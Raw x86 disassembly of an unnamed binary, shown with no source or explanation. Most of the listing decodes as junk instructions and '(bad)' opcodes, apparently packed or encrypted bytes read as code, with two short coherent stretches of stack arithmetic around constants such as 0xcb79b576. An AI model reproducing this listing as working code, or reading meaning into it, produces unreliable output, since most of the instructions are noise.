  407563:	lock test eax,0x56c0981e
  407569:	inc    edx
  40756a:	and    ecx,DWORD PTR [ecx+0x3d]
  40756d:	push   edi
  40756e:	repnz mov edx,fs
  407571:	jns    0x4075bf
  407573:	mov    ebx,DWORD PTR [ebp+edx*2-0x1fc3ce20]
  40757a:	dec    ecx
  40757b:	xchg   BYTE PTR [ebx-0x68d29e61],dh
  407581:	and    eax,0xe3c65d3f
  407586:	ds dec ecx
  407588:	iret   
  407589:	js     0x40750f
  40758b:	add    cl,BYTE PTR [edx+eiz*4+0xe5863ea]
  407592:	xor    DWORD PTR [edx+0x2ac60cd7],ebp
  407598:	add    bh,BYTE PTR [ebp-0x66]
  40759b:	mov    ds:0x51be2104,al
  4075a0:	cmp    al,0x25
  4075a2:	(bad)  
  4075a3:	into   
  4075a4:	jge    0x4075fe
  4075a6:	iret   
  4075a7:	mov    edx,0x23c3abc4
  4075ac:	mov    edx,0xf4f807bc
  4075b1:	xchg   ecx,eax
  4075b2:	jecxz  0x40753a
  4075b4:	jmp    0x40762e
  4075b6:	lds    esi,FWORD PTR [ecx-0x48a1a272]
  4075bc:	push   ss
  4075bd:	dec    ebx
  4075be:	fsubp  st(1),st
  4075c0:	retf   0xa301
  4075c3:	clc    
  4075c4:	jno    0x40763f
  4075c6:	xchg   ebp,eax
  4075c7:	aad    0x1d
  4075c9:	push   edi
  4075ca:	cmp    esi,DWORD PTR [eax-0x255da798]
  4075d0:	xlat   BYTE PTR ds:[ebx]
  4075d1:	repnz pop ebx
  4075d3:	mov    eax,0xafdd15c7
  4075d8:	je     0x40755e
  4075da:	xchg   edx,eax
  4075db:	jnp    0x4075f1
  4075dd:	imul   eax,DWORD PTR [ecx+0x4d],0xa05ab5c6
  4075e4:	mov    bl,0x6b
  4075e6:	cs call 0x84a4:0x7a1c68f7
  4075ee:	push   esp
  4075ef:	mov    ebp,0xdb51402c
  4075f4:	in     eax,0x32
  4075f6:	sub    BYTE PTR [ebp-0x1e],bh
  4075f9:	ins    DWORD PTR es:[edi],dx
  4075fa:	mov    bl,0x8
  4075fc:	dec    ecx
  4075fd:	cmp    eax,0xce09494a
  407602:	stc    
  407603:	push   edx
  407604:	fld    DWORD PTR [edx-0x4bc86a20]
  40760a:	mov    BYTE PTR [ecx],cl
  40760c:	dec    edx
  40760d:	ins    DWORD PTR es:[edi],dx
  40760e:	dec    ebp
  40760f:	js     0x407631
  407611:	ds out 0x17,al
  407614:	jmp    0x40766d
  407616:	les    edi,FWORD PTR [eax]
  407618:	loope  0x4075ae
  40761a:	loopne 0x407606
  40761c:	cmp    BYTE PTR [ebx-0x49],cl
  40761f:	lahf   
  407620:	ins    BYTE PTR es:[edi],dx
  407621:	stc    
  407622:	aam    0x1f
  407624:	mov    eax,0x711e32e4
  407629:	push   eax
  40762a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40762b:	nop
  40762c:	repz pop es
  40762e:	fsub   st,st(2)
  407630:	fnstsw WORD PTR [eax-0x2c3b52ed]
  407636:	shl    BYTE PTR [ebp-0x77c8f88e],cl
  40763c:	stc    
  40763d:	xor    DWORD PTR [edi-0x5e],eax
  407640:	mov    dh,0x7d
  407642:	fistp  WORD PTR [esi+esi*8-0x75]
  407646:	loope  0x4075d2
  407648:	pop    ebp
  407649:	iret   
  40764a:	int    0x89
  40764c:	jle    0x407652
  40764e:	jmp    0x4083e6
  407653:	mov    eax,DWORD PTR [ebp-0x24]
  407656:	add    eax,DWORD PTR [ebp-0x4]
  407659:	mov    DWORD PTR [ebp-0x28],eax
  40765c:	mov    eax,DWORD PTR [ebp-0x28]
  40765f:	mov    eax,DWORD PTR [ebp-0x4]
  407662:	mov    eax,DWORD PTR [ebp-0x28]
  407665:	mov    eax,DWORD PTR [eax+0xc]
  407668:	mov    edx,DWORD PTR [ebp-0x4]
  40766b:	movzx  eax,WORD PTR [edx+eax*1]
  40766f:	cdq    
  407670:	shld   edx,eax,0x2
  407674:	xor    edx,ecx
  407676:	mov    DWORD PTR [ebp+0xc],edx
  407679:	jmp    0x407a1a
  40767e:	sbb    BYTE PTR [edi-0x2f],cl
  407681:	pop    esi
  407682:	call   0x3e77:0x3eb7bc64
  407689:	fnsave [esi-0x14]
  40768c:	mov    ss,WORD PTR [eax-0x4141a842]
  407692:	mov    ebp,0x78bebec4
  407697:	ds or  al,dl
  40769a:	mov    bh,0xa6
  40769c:	add    edi,DWORD PTR [ecx+eax*8]
  40769f:	push   es
  4076a0:	mov    BYTE PTR [ecx],dl
  4076a2:	dec    ecx
  4076a3:	cmp    bl,BYTE PTR [edx-0x39f47e7]
  4076a9:	sar    DWORD PTR [edi+0x7f],1
  4076ac:	add    eax,0x22582b42
  4076b1:	clc    
  4076b2:	pop    ecx
  4076b3:	or     ecx,DWORD PTR [ebp-0x6ec4b195]
  4076b9:	in     al,0x55
  4076bb:	paddb  mm3,mm7
  4076be:	shr    BYTE PTR [edi+0x5e],1
  4076c1:	cmp    BYTE PTR [edi],ch
  4076c3:	lds    eax,FWORD PTR [eax+0x59]
  4076c6:	and    ebp,DWORD PTR [eax]
  4076c8:	ret    
  4076c9:	loope  0x407730
  4076cb:	sbb    al,0xc8
  4076cd:	mov    BYTE PTR [esi+0x2cce874c],bl
  4076d3:	(bad)  
  4076d4:	in     al,0x9f
  4076d6:	pop    esp
  4076d7:	xchg   ecx,eax
  4076d8:	xchg   ebp,eax
  4076d9:	mov    ebx,0x6fc4be21
  4076de:	add    edi,0xf8fea4a1
  4076e4:	push   ebp
  4076e5:	or     ch,BYTE PTR [esi-0x67]
  4076e8:	ret    0x2134
  4076eb:	lods   al,BYTE PTR ds:[esi]
  4076ec:	sbb    ecx,DWORD PTR [edi]
  4076ee:	mov    dh,al
  4076f0:	fdivr  st(5),st
  4076f2:	inc    edi
  4076f3:	mov    cl,0x4
  4076f5:	aad    0x74
  4076f7:	in     eax,dx
  4076f8:	sbb    bl,ah
  4076fa:	xor    ah,bl
  4076fc:	fwait
  4076fd:	add    DWORD PTR [ebp-0x572eee4e],ebx
  407703:	mov    ebp,0x53da4240
  407708:	sub    BYTE PTR [edx-0x4943788e],ch
  40770e:	stc    
  40770f:	loopne 0x407709
  407711:	pop    edi
  407712:	sbb    eax,0x5109e1a7
  407717:	dec    ebx
  407719:	ins    BYTE PTR es:[edi],dx
  40771a:	mov    ebx,0xdeaee3f7
  40771f:	call   0xbe6c:0xb40174c8
  407726:	ret    
  407727:	push   DWORD PTR [ebp+0x69]
  40772a:	xchg   esp,eax
  40772b:	popf   
  40772c:	add    eax,DWORD PTR [esi-0x3b]
  40772f:	clc    
  407730:	daa    
  407731:	in     eax,0x88
  407733:	dec    esi
  407734:	pop    eax
  407735:	int3   
  407736:	cs sysexit 
  407739:	or     DWORD PTR [eax-0x5c],edi
  40773c:	xor    dl,BYTE PTR [esi+0x17]
  40773f:	jns    0x4077a1
  407741:	xchg   esp,eax
  407742:	dec    esp
  407743:	cld    
  407744:	ret    0x485f
  407747:	pop    ecx
  407748:	adc    edx,DWORD PTR [edi]
  40774a:	ss scas al,BYTE PTR es:[edi]
  40774c:	aad    0x0
  40774e:	xchg   ebx,eax
  40774f:	fs or  al,0xa
  407752:	pop    esp
  407753:	mov    ah,0x65
  407755:	dec    ebp
  407757:	(bad)  
  407758:	rol    DWORD PTR [edx+0xc7fc6c6],1
  40775e:	mov    ebp,0x2103771f
  407763:	jno    0x407790
  407765:	push   ecx
  407766:	gs push 0xffffffc5
  407769:	xchg   ecx,eax
  40776a:	push   ebx
  40776b:	sbb    ebp,DWORD PTR [ebx-0x603d96fa]
  407771:	push   ss
  407772:	cwde   
  407773:	sub    dh,BYTE PTR ds:0x6ad16789
  407779:	add    eax,0x7898e713
  40777e:	dec    eax
  40777f:	repz sub BYTE PTR [ecx-0x2df07967],0x30
  407787:	je     0x40777b
  407789:	push   0xfffffffb
  40778b:	aam    0x9e
  40778d:	sahf   
  40778e:	push   esp
  40778f:	mov    ebp,0x1b164d9d
  407794:	in     al,dx
  407795:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407796:	xchg   esp,eax
  407797:	out    dx,al
  407798:	ret    
  407799:	ins    BYTE PTR es:[edi],dx
  40779a:	adc    eax,0xa3d67a1a
  40779f:	inc    ecx
  4077a0:	mov    edi,0xef0ee6cf
  4077a5:	fwait
  4077a6:	or     dh,BYTE PTR [esp+ebp*1-0x37]
  4077aa:	and    esi,0x394b3601
  4077b0:	cli    
  4077b1:	or     DWORD PTR [edx-0x6b9e3397],0xffffffc7
  4077b8:	and    edi,DWORD PTR [ecx-0x46e1c5d1]
  4077be:	and    eax,0xf127e0b6
  4077c3:	jbe    0x40782d
  4077c5:	push   esp
  4077c6:	mov    ch,0x85
  4077c8:	cld    
  4077c9:	call   0x9bd2:0x58e3f1e1
  4077d0:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077d2:	jne    0x407802
  4077d4:	push   edx
  4077d5:	data16 fdivr QWORD PTR [eax+eiz*8-0xd9a1a1c]
  4077dd:	or     BYTE PTR [esi-0x13],cl
  4077e0:	add    BYTE PTR [ebx+0x3a],cl
  4077e3:	aad    0xc
  4077e5:	retf   
  4077e6:	ror    DWORD PTR [edx+edi*4],0x8c
  4077ea:	neg    BYTE PTR [edx+ebx*8+0x5c7884ff]
  4077f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4077f2:	pop    edx
  4077f3:	jecxz  0x407842
  4077f5:	shr    DWORD PTR [edi+edi*2+0x16acc68e],0x5b
  4077fd:	jb     0x4077ab
  4077ff:	xor    al,0x7c
  407801:	fwait
  407802:	aaa    
  407803:	jns    0x4077c5
  407805:	dec    ebp
  407806:	(bad)
  40780b:	pop    ebp
  40780c:	test   BYTE PTR ss:[edx],dl
  40780f:	add    bh,0xf8
  407812:	sbb    eax,0x81e478e8
  407817:	inc    eax
  407818:	or     al,0x51
  40781a:	mov    cs,WORD PTR [edi*1+0x479dd59f]
  407821:	xor    al,0xaf
  407823:	xchg   dl,dh
  407825:	mov    bh,dl
  407827:	jle    0x4077f8
  407829:	sahf   
  40782a:	cld    
  40782b:	stos   BYTE PTR es:[edi],al
  40782c:	pusha  
  40782d:	jmp    0x24db:0x2865a91a
  407834:	jle    0x40782e
  407836:	in     al,0xfc
  407838:	in     al,dx
  407839:	xor    al,ch
  40783b:	dec    eax
  40783c:	sahf   
  40783d:	fstp   QWORD PTR [ebx]
  40783f:	sti    
  407840:	lods   al,BYTE PTR ds:[esi]
  407841:	xor    eax,0x21
  407844:	mov    eax,0x5d3fa207
  407849:	add    DWORD PTR [edi-0x4b204637],ebp
  40784f:	push   edi
  407850:	fidiv  DWORD PTR [edi-0x4170153d]
  407856:	cmp    dh,BYTE PTR [eax+0x4c]
  407859:	and    BYTE PTR [eax-0x47],al
  40785c:	or     DWORD PTR [edi],ebx
  40785e:	and    BYTE PTR [ebx+0x60],bh
  407861:	stos   DWORD PTR es:[edi],eax
  407862:	and    BYTE PTR [ebx+0x43],bh
  407865:	outs   dx,DWORD PTR ds:[esi]
  407866:	jne    0x407832
  407868:	int3   
  407869:	xorps  xmm0,XMMWORD PTR [esi]
  40786c:	push   eax
  40786d:	cld    
  40786e:	outs   dx,BYTE PTR ds:[esi]
  40786f:	push   esi
  407870:	xchg   ecx,eax
  407871:	dec    edi
  407872:	add    dh,BYTE PTR [eax+0x74]
  407875:	cmp    DWORD PTR [edx],ecx
  407877:	mov    BYTE PTR [ebx+0x5c68a1f5],ch
  40787d:	push   cs
  40787e:	fs pop eax
  407880:	inc    edi
  407881:	push   esi
  407882:	outs   dx,DWORD PTR ds:[esi]
  407883:	daa    
  407884:	cmp    eax,0xaa728ec0
  407889:	push   eax
  40788a:	sbb    esi,DWORD PTR [esi-0x63]
  40788d:	mov    edx,0xa0f5ac3
  407892:	loope  0x4078b9
  407894:	push   0x783ee0d8
  407899:	pop    esi
  40789a:	out    0x64,al
  40789c:	pop    edi
  40789d:	jne    0x407858
  40789f:	repz test al,0x16
  4078a2:	rol    eax,cl
  4078a4:	repz jae 0x4078e3
  4078a7:	lahf   
  4078a8:	out    dx,eax
  4078a9:	or     al,0xc3
  4078ab:	push   ebp
  4078ac:	les    edx,FWORD PTR [ebp-0x58b50385]
  4078b2:	push   esi
  4078b3:	jns    0x4078e8
  4078b5:	daa    
  4078b6:	jno    0x407846
  4078b8:	jne    0x407930
  4078ba:	xchg   esp,eax
  4078bb:	in     eax,0xf4
  4078bd:	adc    al,0xa9
  4078bf:	mov    esp,0xefd16a68
  4078c4:	push   esp
  4078c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078c6:	pop    eax
  4078c7:	pop    edx
  4078c8:	js     0x4078f6
  4078ca:	jns    0x4078bf
  4078cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4078cd:	xchg   ebp,eax
  4078ce:	mov    gs,WORD PTR [edi-0x67]
  4078d1:	pop    eax
  4078d2:	leave  
  4078d3:	mov    esi,0x17841989
  4078d8:	lods   al,BYTE PTR ds:[esi]
  4078d9:	mov    bh,0x22
  4078db:	jnp    0x4078c5
  4078dd:	mov    esi,0x5842e5fb
  4078e2:	retf   0xb7db
  4078e5:	mov    ah,0x93
  4078e7:	mov    ecx,0x37b73945
  4078ec:	in     al,dx
  4078ed:	out    dx,al
  4078ee:	mov    eax,0xe0965419
  4078f3:	add    ecx,DWORD PTR [eax+0x2c]
  4078f6:	jmp    0x40794c
  4078f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078f9:	idiv   BYTE PTR [eax-0x22]
  4078fc:	sub    ebx,DWORD PTR [esi]
  4078fe:	cmp    DWORD PTR [eax-0x7e20ebbf],esi
  407904:	mov    eax,0x8dc85191
  407909:	mov    eax,ds:0x43c23bf6
  40790e:	int    0xda
  407910:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407911:	sahf   
  407912:	and    eax,0xf846601a
  407918:	int3   
  407919:	xchg   ecx,eax
  40791a:	sub    DWORD PTR [edx],edx
  40791c:	lahf   
  40791d:	or     ch,BYTE PTR [esi+0x506ba91e]
  407923:	and    esi,DWORD PTR [ebx-0x5a]
  407926:	jmp    0xfb53:0x45835959
  40792d:	pop    esp
  40792e:	imul   edx,DWORD PTR [edi-0x3e],0x29
  407932:	popf   
  407933:	fdivr  DWORD PTR [esi+edi*2-0x62]
  407937:	cmp    eax,0x7dd65f30
  40793c:	inc    ebx
  40793d:	adc    edi,esi
  40793f:	xchg   ebx,eax
  407940:	mov    ch,0xf4
  407942:	fdivr  st(7),st
  407944:	adc    bh,BYTE PTR [edx-0x402abb03]
  40794a:	push   eax
  40794b:	xor    eax,0x590bdb3c
  407950:	jmp    0x40792a
  407952:	adc    ebx,DWORD PTR [ebx+0x346c327a]
  407958:	xchg   esp,eax
  407959:	scas   eax,DWORD PTR es:[edi]
  40795a:	jbe    0x407902
  40795c:	cwde   
  40795d:	mov    ss,eax
  40795f:	cdq    
  407960:	pop    eax
  407961:	pop    esp
  407962:	dec    ebp
  407963:	add    BYTE PTR [edx+0x72],ch
  407966:	ds ret 0x9880
  40796a:	addr16 dec ecx
  40796c:	fdivr  DWORD PTR [ecx-0x12a10943]
  407972:	fcomp  DWORD PTR [esi+0x3375eb00]
  407978:	jle    0x407987
  40797a:	and    esi,eax
  40797c:	test   al,0x71
  40797e:	ret    0xeb03
  407981:	push   edi
  407982:	mov    edx,0xd8146397
  407987:	addr16 ret 
  407989:	loope  0x4079e3
  40798b:	push   esp
  40798c:	mov    ch,0xd
  40798e:	sbb    eax,0xae24749
  407993:	repnz adc eax,0xe27eff4e
  407999:	(bad)  
  40799a:	fnsave [edi]
  40799c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40799d:	popa   
  40799e:	ss pop ecx
  4079a0:	cs repnz das 
  4079a3:	inc    esi
  4079a4:	pop    ds
  4079a5:	xor    BYTE PTR [eax+edx*8-0x33],dh
  4079a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4079aa:	(bad)  
  4079ab:	cwde   
  4079ac:	jb     0x407984
  4079ae:	inc    edi
  4079af:	add    BYTE PTR [edi+0x7d],dl
  4079b2:	mov    dl,0x90
  4079b4:	ror    DWORD PTR [edx],cl
  4079b6:	fistp  WORD PTR [edx]
  4079b8:	rol    esi,0x74
  4079bb:	mov    ebx,0x181f8a60
  4079c0:	xchg   ebx,eax
  4079c1:	and    eax,0xffde9b0e
  4079c6:	inc    edi
  4079c7:	popa   
  4079c8:	dec    eax
  4079c9:	lods   eax,DWORD PTR ds:[esi]
  4079ca:	and    BYTE PTR [esi-0x4026eb04],ah
  4079d0:	xlat   BYTE PTR ds:[ebx]
  4079d1:	jno    0x4079d2
  4079d3:	sub    BYTE PTR [esi-0xe45999c],al
  4079d9:	pop    ebx
  4079da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079db:	push   ss
  4079dc:	ror    DWORD PTR [esi+0x625ff700],0x2a
  4079e3:	aam    0xe8
  4079e5:	mov    ecx,0xbd4ca24
  4079ea:	retf   
  4079eb:	sbb    ch,BYTE PTR [esi]
  4079ed:	xchg   edi,eax
  4079ee:	and    BYTE PTR [ebx-0x388fb9c9],ah
  4079f4:	pusha  
  4079f5:	cmc    
  4079f6:	sbb    dl,BYTE PTR [ecx+0x37]
  4079f9:	jmp    0x407a2d
  4079fb:	pop    edi
  4079fc:	(bad)  
  4079fd:	jp     0x407a62
  4079ff:	push   ds
  407a00:	inc    esp
  407a01:	or     BYTE PTR [ebx-0x187c3921],al
  407a07:	mov    esp,DWORD PTR [ebx+eiz*2-0x4bbe0eeb]
  407a0e:	inc    ax
  407a10:	adc    eax,0xa725bb71
  407a15:	adc    BYTE PTR [esi],bh
  407a17:	fnstenv [eax+0x5b]
  407a1a:	mov    edx,DWORD PTR [ebp-0x58]
  407a1d:	shl    eax,0x2
  407a20:	mov    DWORD PTR [ebp+0x10],edx
  407a23:	mov    edx,DWORD PTR [ebp-0x54]
  407a26:	xor    eax,0xcb79b576
  407a2b:	mov    DWORD PTR [ebp+0x14],edx
  407a2e:	cmp    eax,DWORD PTR [ebp+0x10]
  407a31:	jne    0x408352
  407a37:	mov    eax,edx
  407a39:	cmp    DWORD PTR [ebp+0xc],eax
  407a3c:	jne    0x408352
  407a42:	mov    DWORD PTR [ebp+0x8],0xcb79b576
  407a49:	mov    DWORD PTR [ebp+0xc],ecx
  407a4c:	mov    DWORD PTR [ebp-0x60],0xcb79b572
  407a53:	mov    DWORD PTR [ebp-0x5c],ecx
  407a56:	mov    DWORD PTR [ebp-0x48],0xcb79b57e
  407a5d:	mov    DWORD PTR [ebp-0x44],ecx
  407a60:	mov    DWORD PTR [ebp-0x38],0xcb79b57a
  407a67:	mov    DWORD PTR [ebp-0x34],ecx
  407a6a:	mov    eax,DWORD PTR [ebp+0x8]
  407a6d:	jmp    0x407e0e
  407a72:	cmp    eax,0x2444c2a4
  407a77:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a78:	inc    eax
  407a79:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a7a:	ret    0x7a7b
  407a7d:	xchg   edx,eax
  407a7e:	mov    edx,ecx
  407a80:	call   0xbdbe:0xbe5dbde3
  407a87:	les    edi,FWORD PTR [esi+0x362a1dbe]
  407a8d:	xchg   edx,eax
  407a8e:	mov    BYTE PTR [edi],ch
  407a90:	inc    eax
  407a91:	ret    0xea6e
  407a94:	push   esi
  407a95:	mov    bh,0x88
  407a97:	sbb    eax,0x3484c070
  407a9c:	out    0x3,al
  407a9e:	jmp    0xbcfd2a68
  407aa3:	jo     0x407a8b
  407aa5:	test   BYTE PTR [eax-0x42c65437],al
  407aab:	xchg   BYTE PTR [ebp-0x2c],bh
  407aae:	add    al,0xc7
  407ab0:	and    bh,BYTE PTR [edx-0x3b]
  407ab3:	sti    
  407ab4:	xchg   ebx,eax
  407ab5:	sub    eax,0x7692a908
  407aba:	push   eax
  407abb:	add    eax,ebp
  407abd:	mov    esi,DWORD PTR [ebx+0x5a]
  407ac0:	sti    
  407ac1:	popf   
  407ac2:	inc    esp
  407ac3:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  407ac5:	xor    esp,ecx
  407ac7:	jg     0x407af9
  407ac9:	push   esi
  407aca:	daa    
  407acb:	mov    ah,0xd6
  407acd:	mov    ecx,0xba718f0c
  407ad2:	mov    bl,0xf1
  407ad4:	dec    esp
  407ad5:	mov    bh,0xc6
  407ad7:	arpl   WORD PTR [edi+0x629ea872],ax
  407add:	inc    ebp
  407ade:	into   
  407adf:	shr    DWORD PTR [esi+edx*2-0x27],1
  407ae3:	xor    DWORD PTR [edx-0x30],0x53812118
  407aea:	aad    0x1c
  407aec:	aas    
  407aed:	mov    ah,0x77
  407aef:	ins    BYTE PTR es:[edi],dx
  407af0:	push   eax
  407af1:	mov    eax,ds:0x8d340213
  407af6:	add    eax,0xa638bdc8
  407afb:	cmp    al,0x33
  407afd:	xchg   edx,eax
  407afe:	les    esi,FWORD PTR [edi]
  407b00:	stos   BYTE PTR es:[edi],al
  407b01:	lahf   
  407b02:	xchg   edi,eax
  407b03:	fisub  WORD PTR [esi+0x2c]
  407b06:	std    
  407b07:	rcr    BYTE PTR [edx+0x68],0xc9
  407b0b:	rcl    DWORD PTR [eax*8-0x5e435c07],0x1d
  407b13:	sbb    bh,bh
  407b15:	leave  
  407b16:	mov    eax,0x89cc25b0
  407b1b:	pop    edi
  407b1c:	enter  0xb416,0x7f
  407b20:	out    dx,al
  407b21:	out    0x5f,al
  407b23:	push   esp
  407b24:	adc    BYTE PTR [edx],0x1a
  407b27:	les    ebp,FWORD PTR [ebp-0x6e4618e3]
  407b2d:	inc    eax
  407b2e:	push   eax
  407b2f:	lahf   
  407b30:	cmp    bl,cl
  407b32:	std    
  407b33:	test   eax,0x5975d554
  407b38:	cdq    
  407b39:	stc    
  407b3a:	sub    edi,DWORD PTR [edi-0x65]
  407b3d:	xchg   ebx,eax
  407b3e:	aas    
  407b3f:	adc    ecx,edx
  407b41:	repnz imul ecx,DWORD PTR [edi-0x5c0821ac],0xffffffbb
  407b49:	cmp    eax,DWORD PTR [edi-0x5d25e80f]
  407b4f:	xlat   BYTE PTR ds:[ebx]
  407b50:	lods   al,BYTE PTR ds:[esi]
  407b51:	jno    0x407b24
  407b53:	into   
  407b54:	xor    al,dh
  407b56:	pop    esi
  407b57:	mov    dl,0x92
  407b59:	les    edx,FWORD PTR [ebx+ebp*2-0x7fd2efd9]
  407b60:	pop    bp
  407b62:	ret    
  407b63:	das    
  407b64:	or     eax,0xdceb05d9
  407b69:	xor    ecx,DWORD PTR [ebp-0x2f64c7c5]
  407b6f:	das    
  407b70:	xchg   esi,eax
  407b71:	pop    eax
  407b72:	lods   al,BYTE PTR ds:[esi]
  407b73:	xchg   ebp,eax
  407b74:	mov    al,0x3
  407b76:	mov    DWORD PTR [ecx+edx*1-0x56adeaaa],ebx
  407b7d:	sbb    al,0xd4
  407b7f:	jg     0x407bfa
  407b81:	mov    ds:0x78e27cab,eax
  407b86:	pop    esi
  407b87:	mov    DWORD PTR [ecx],esp
  407b89:	inc    edx
  407b8a:	fistp  DWORD PTR [eax-0x4f]
  407b8d:	xchg   DWORD PTR [ebp+0x61483899],edx
  407b93:	sahf   
  407b94:	adc    esi,esp
  407b96:	je     0x407b51
  407b98:	aaa    
  407b99:	sbb    eax,0x7f22dfcf
  407b9e:	dec    esp
  407b9f:	gs int 0x49
  407ba2:	fidivr WORD PTR [ebp+0x5008dbe6]
  407ba8:	pop    eax
  407ba9:	xchg   ebx,eax
  407baa:	popa   
  407bab:	adc    ecx,DWORD PTR [ebx+0x47]
  407bae:	or     BYTE PTR [esi],bl
  407bb0:	rcr    dh,0x4
  407bb3:	out    dx,al
  407bb4:	retf   0xc53f
  407bb7:	imul   edi,DWORD PTR [esi-0x4b3b8a26],0xd1a96c1d
  407bc1:	scas   eax,DWORD PTR es:[edi]
  407bc2:	(bad)  
  407bc3:	retf   0xafb0
  407bc6:	js     0x407bae
  407bc8:	pop    esi
  407bc9:	bound  ebx,QWORD PTR [edi+0x0]
  407bcc:	sbb    dl,BYTE PTR [eax-0x51c5cf17]
  407bd2:	mov    DWORD PTR [ebx-0x788846d],ecx
  407bd8:	std    
  407bd9:	call   FWORD PTR [esi]
  407bdb:	mov    dh,0xd2
  407bdd:	ss inc esi
  407bdf:	sbb    al,0xf0
  407be1:	lea    esi,[edi+0x212d2118]
  407be7:	es inc edx
  407be9:	or     BYTE PTR [esi-0x80],bl
  407bec:	cmp    DWORD PTR [ecx-0x41],ebx
  407bef:	fisub  DWORD PTR [ebx+0x5efd6d08]
  407bf5:	mov    ch,0x17
  407bf7:	(bad)  
  407bf8:	fisubr DWORD PTR [ebx+0x75]
  407bfb:	or     esp,edx
  407bfd:	fist   WORD PTR [ebp-0x5c]
  407c00:	cli    
  407c01:	test   DWORD PTR [ebp+0x27],edx
  407c04:	sub    al,0x18
  407c06:	fcom   QWORD PTR [esp+ebx*1+0x6e45697a]
  407c0d:	mov    BYTE PTR [eax+0x7a],bl
  407c10:	mov    bl,0xad
  407c12:	test   DWORD PTR [ecx+ebx*1],edi
  407c15:	aad    0x6f
  407c17:	cdq    
  407c18:	imul   edx,ecx,0x85ff27f1
  407c1e:	std    
  407c1f:	outs   dx,BYTE PTR ds:[esi]
  407c20:	sar    BYTE PTR [edx+0x26c37830],0x3e
  407c27:	scas   al,BYTE PTR es:[edi]
  407c28:	js     0x407c8d
  407c2a:	pop    ebp
  407c2b:	sbb    al,0xcc
  407c2d:	jbe    0x407c9e
  407c2f:	outs   dx,DWORD PTR ds:[esi]
  407c30:	dec    esp
  407c31:	div    BYTE PTR [ebp-0x1f042cc1]
  407c37:	hlt    
  407c38:	stos   DWORD PTR es:[edi],eax
  407c39:	push   ecx
  407c3a:	sbb    DWORD PTR [eax-0x9d8f2e4],eax
  407c40:	sub    al,0x9d
  407c42:	mov    edx,ebx
  407c44:	and    edx,DWORD PTR [esi]
  407c46:	push   edx
  407c47:	jecxz  0x407c30
  407c49:	jns    0x407c12
  407c4b:	lods   al,BYTE PTR ds:[esi]
  407c4c:	jmp    0x407cbc
  407c4e:	sbb    DWORD PTR [edx-0x4b5d5994],edi
  407c54:	sbb    eax,DWORD PTR [edi]
  407c56:	xchg   ebp,eax
  407c57:	fs and eax,0x730e31db
  407c5d:	arpl   WORD PTR es:[edi-0xddcf4a2],di
  407c64:	and    al,bl
  407c66:	call   0x376e:0x609ee0b8
  407c6d:	stos   BYTE PTR es:[edi],al
  407c6e:	dec    edi
  407c6f:	dec    ebx
  407c70:	ja     0x407ca0
  407c72:	scas   eax,DWORD PTR es:[edi]
  407c73:	mov    bh,0x91
  407c75:	xor    eax,0xf2dc022b
  407c7a:	aaa    
  407c7b:	iret   
  407c7c:	(bad)  
  407c7d:	push   0xffffff9b
  407c7f:	out    dx,eax
  407c80:	stos   DWORD PTR es:[edi],eax
  407c81:	jae    0x407cae
  407c83:	push   esi
  407c84:	mov    DWORD PTR [edi],ebx
  407c86:	daa    
  407c87:	(bad)  
  407c88:	lods   al,BYTE PTR ds:[esi]
  407c89:	int    0x8e
  407c8b:	inc    esi
  407c8c:	jno    0x407c10
  407c8e:	push   ecx
  407c8f:	adc    BYTE PTR [ebx+eiz*2-0x62],0x8c
  407c94:	pusha  
  407c95:	into   
  407c96:	pop    es
  407c97:	mov    cl,0xcc
  407c99:	cmp    al,BYTE PTR [ebx]
  407c9b:	dec    ebx
  407c9c:	rcl    BYTE PTR [ebp-0x794859fd],0x47
  407ca3:	push   ss
  407ca4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ca5:	scas   al,BYTE PTR es:[edi]
  407ca6:	retf   
  407ca7:	out    0x16,al
  407ca9:	pop    ds
  407caa:	jbe    0x407c2c
  407cac:	pop    esp
  407cad:	mov    DWORD PTR [eax+ebp*4-0x688b493d],ebp
  407cb4:	ficomp DWORD PTR [ecx-0x62]
  407cb7:	mov    cl,0xed
  407cb9:	push   esi
  407cba:	jle    0x407c58
  407cbc:	in     al,dx
  407cbd:	loop   0x407c7e
  407cbf:	test   ebp,edx
  407cc1:	call   0xf6ca400d
  407cc6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407cc7:	aam    0x8a
  407cc9:	loope  0x407ce9
  407ccb:	scas   al,BYTE PTR es:[edi]
  407ccc:	enter  0x1190,0x3b
  407cd0:	push   ebp
  407cd1:	mov    eax,ds:0x1820a5b3
  407cd6:	push   edx
  407cd7:	or     DWORD PTR ds:0x15312f50,edx
  407cdd:	fisttp QWORD PTR [ebx+0x70]
  407ce0:	lods   al,BYTE PTR ds:[esi]
  407ce1:	(bad)  
  407ce2:	sbb    BYTE PTR [ecx],ah
  407ce4:	xchg   esi,eax
  407ce5:	std    
  407ce6:	stos   DWORD PTR es:[edi],eax
  407ce7:	(bad)  
  407ce8:	std    
  407ce9:	cmp    BYTE PTR [edx+esi*8+0x1a],bl
  407ced:	pop    ss
  407cee:	xchg   esi,eax
  407cef:	sub    BYTE PTR [ebx+ecx*1],cl
  407cf2:	shr    DWORD PTR [ecx],0xe
  407cf5:	push   ds
  407cf6:	scas   al,BYTE PTR es:[edi]
  407cf7:	fs fwait
  407cf9:	push   edx
  407cfa:	sub    dl,al
  407cfc:	and    eax,DWORD PTR [ecx]
  407cfe:	sbb    BYTE PTR [esi-0x45d88960],0xc
  407d05:	ds call 0xc1d2:0x5c022382
  407d0d:	push   0xc357e693
  407d12:	fidiv  DWORD PTR [esp+ecx*8-0x213d9499]
  407d19:	ss inc ebp
  407d1b:	jl     0x407cad
